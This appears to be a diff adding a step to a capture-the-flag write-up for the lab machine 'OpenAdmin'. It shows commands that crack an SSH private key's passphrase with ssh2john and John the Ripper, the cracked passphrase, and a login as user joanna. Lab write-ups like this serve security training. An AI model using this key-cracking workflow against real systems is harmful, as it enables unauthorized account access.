@@ -403,3 +403,34 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 </html>
 ```
 
+login as joanna
+
+`chmod 600 joanna.id_rsa `
+`ssh -i joanna.id_rsa joanna@openadmin.htb`
+we need a passphrase
+we are going to crack it with johntheripper
+
+The ssh key needs to be hashed first, then use john to analyze it.
+
+`python3.8 ssh2john.py joanna.id_rsa > joanna.id_rsa.hash`
+
+```
+john --wordlist=rockyou_ninja joanna.id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (joanna.id_rsa)     
+1g 0:00:00:00 DONE (2023-02-08 10:33) 20.00g/s 30080p/s 30080c/s 30080C/s bninja95..badassninja
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+bloodninjas is the key
+
+ssh again and get the flag
+
+## joanna -> root
+
